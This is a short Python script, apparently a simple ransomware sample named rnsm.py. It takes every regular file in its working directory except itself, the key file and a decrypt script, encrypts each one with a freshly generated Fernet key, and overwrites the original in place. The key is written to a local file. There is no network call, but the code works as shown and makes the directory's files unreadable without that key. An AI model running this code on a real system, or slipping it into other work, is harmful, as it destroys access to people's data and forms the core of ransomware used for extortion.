#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "rnsm.py" or file == "theKey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("theKey.key","wb") as theKey:
	theKey.write(key)

for file in files:
	with open(file, "rb") as theFile:
		contents = theFile.read()
	encrypted_contents = Fernet(key).encrypt(contents)
	with open(file, "wb") as theFile:
		theFile.write(encrypted_contents)
